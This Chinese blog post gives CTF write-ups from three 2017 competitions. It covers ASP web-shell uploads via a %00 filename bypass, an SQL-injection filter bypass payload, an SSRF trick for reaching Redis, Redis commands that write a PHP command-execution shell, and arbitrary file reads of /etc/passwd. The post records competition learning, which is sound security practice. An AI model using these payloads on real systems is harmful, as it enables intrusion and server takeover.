---
layout: post
title: CCTF_DCTF_XDCTF的收获
date: 2017-10-02
categories: Write_Up
---

### CCTF

嘛，CCTF线上已经忘记了，当时的Writeup也忘记保存了。只记得做了几个Web，然后逆向什么的队友带飞（感谢哒哒哒哒哒以及二进制大佬）。

线下怎么说呢，第一次参加渗透版线下，主办方给了三个不同的ip，每个ip下有三层网络。Emmm...我觉得对于我们这种弱鸡一层就够了。ip1没有web服务器，只有一个22端口和一个奇怪的端口。队友说奇怪的端口是一个什么服务（忘记了），进了1的内网可以直接访问进1。ip2是一个web服务器，应该是一个商城，没记错的话。各种找漏洞利用点。robots写着站长英语不好，所以没有写。后来脑洞大开，想后台地址会不会是houtai之内的中文后台名，结果还真猜对了。后来发现后台有个越权，可以不登陆直接修改礼物信息，addlipin.asp。这里面可以直接上传图片等。于是乎%00绕过，%00记得使用的URL编码。成功上传一个asp小马，然后小马上传大马。大马搜索关键字有flag的文件。成功找到2个flag。可是还有个数据库里的flag，400分。没拿到。这道题很奇怪，各种提权都失败。cmd.exe传了也没用。控制命令几乎一个没有。结果我队一直认为必须想办法提权，或者自己加入cmd的命令写注册表开启3389。然后找到flag（asp编码能力太差）并进入ip1且可以进入下层网络。

emmm...结果就是，卡住太久，导致ip3没有做完，ip3只找到一个flag，卡在后台登录界面，后台登录赛后听说有注入，不过自己试的时候完全没发现啊。于是大佬们注入的注入，爆破密码的爆破密码，唯独我拿了个国外字典跑了半天没跑出来放弃了。赛后听说密码是admin123，心里很崩溃，因为自己试了adminadmin\admin123456\admin1234等，就是没尝试admin123。。。不然又能拿到flag。还能往ip1或者下层网络继续渗透。。。

所以，因为死磕ip2的提权太久，从第6降到了第12，成功拿到线上三等奖（摊手）。对了，还有个比赛时的趣事，好像因为ip3的界面留下了一个版权信息，于是我加了版权信息留下的qq，以为是主办方的人，让我们社工一波。跑过去社工一下，发现根本不是！而是真的cms的厂商。。。尴尬，和人尬聊。

总结：字典要强大，不要死磕（虽然死磕是个好习惯）。工具、字典什么的都要提前准备好。还是要多打多做积累经验才是王道。

### DCTF

嘛，被虐的体无完肤。junior的题凭什么最多才5point，一般都1、2point。还特么很难。web1是一个SQL注入，源代码泄露。拿到源代码。

	<?php

	$db  = mysqli_connect('localhost','root','root','test');
	
	$id  = @$_GET['id'];
	$key = $db->real_escape_string(@$_GET['key']);
	//$key = @$_GET['key'];
	
	if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
	    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected
	
	$query = "SELECT `id`,`name`,`key` FROM `user` WHERE `id` = $id AND `key` = '".$key."' ";
	echo $query;
	$q = $db->query($query);
	
	if($q->num_rows) {
	    echo '<h3>Users:</h3><ul>';
	    while($row = $q->fetch_array()) {
	        echo '<li>'.$row['name'].'</li>';
	    }
	
	    echo '</ul>';
	} else {
	    die('<h3>Nop.</h3>');
	}
	
源代码如上。id正则过滤很多，看着头大。key没有正则过滤但是有一个real_escape_string()。开始以为必须要绕过key，于是各种尝试宽字节无果，然后想办法设置编码为有问题的编码无果。毕竟sql语句拼接就这样，没地方可拼。后来实在没有办法，id的正则丢进正则测试工具，所有符号打一遍，留下没被过滤的符号看看。emmm....事后发现的关键有`;``0``<``>``%`。

当时想到`id=0;`截断语句，然后插入新的语句再注释掉后面的。无果。后来发现`id=0<>true;%00`;与%00缺一不可。没有`;`会造成语句没有结束继续等待的sql语法错误，没有`%00`后面的语句会被执行造成sql语法错误。

web2首先被导向有一个flag.php，很明显要得到它，直接到index.php看看是什么，发现是一个httpbin web应用。

![1](/images/posts/dctf/1.png)

可以选择POST、GET请求，URL进行了过滤，不允许localhost、127.0.0.1等域名。Data反而似乎没什么限制。这个会以你选择的请求方式请求一次你输入的URL，并将简单的HTTP报文返回。开始以为能导致命令执行，尝试多次，无果。返回URL错误。后来大佬表示这是一个CSRF、MD5碰撞。这道题有两个思路，CSRF是通过请求http://foo@127.0.0.1@foo/，欺骗DNS绕过URL的检测。然后在端口6379上发现返回。猜测是redis的默认端口。于是改为POST请求发送Data。Data中写redis的命令，往服务器写入shell.php。

	CONFIG set dir /var/www/sandbox
	CONFIG set dbfilename shell.php
	SET a '<?=`$_GET[1]`?>'
	SAVE

POST上去后，服务器返回如下：

	-ERR unknown command 'POST'
	-ERR unknown command 'Host:'
	-ERR unknown command 'Authorization:'
	-ERR unknown command 'Accept:'
	-ERR unknown command 'Content-Length:'
	-ERR unknown command 'Content-Type:'
	+OK
	+OK
	+OK

于是访问shell.php即可拿到flag.php

### XDCTF

嘛，web3的index.php会通过参数file打开index.html和flag.html。flag.html只有你什么都找不到这样的信息，然后目录扫描什么的又得不到信息。不过惊喜的是file可以得到index.php自己，在注释里看到了所有的源代码。于是尝试文件任意读取，可是居然找不到flag.php？？？？？喵喵喵？？？好吧，找到一个.DS_Store。可能flag的名字就在里面吧，于是下载下来解开查看目录，空的？？？喵喵喵？？？没办法，只有查看敏感文件如/etc/passwd，没有有用的信息，/etc/hosts。在hosts找到了这些。

	127.0.0.1 localhost
	::1 localhost ip6-localhost ip6-loopback
	fe00::0 ip6-localnet
	ff00::0 ip6-mcastprefix
	ff02::1 ip6-allnodes
	ff02::2 ip6-allrouters
	172.18.0.3 ecba35241264
	
猜测是扫描C段找到172.18.0.3，然后就可以拿到权限或者找到flag。然而服务器日常宕机。扫描不出来。。。卡死在这一步。

转载请注明：[碎雪的小屋](http://RoyTse.github.io) » [CCTF_DCTF_XDCTF的收获](http://RoyTse.github.io/2017/10/CCTF_DCTF_XDCTF的收获/)  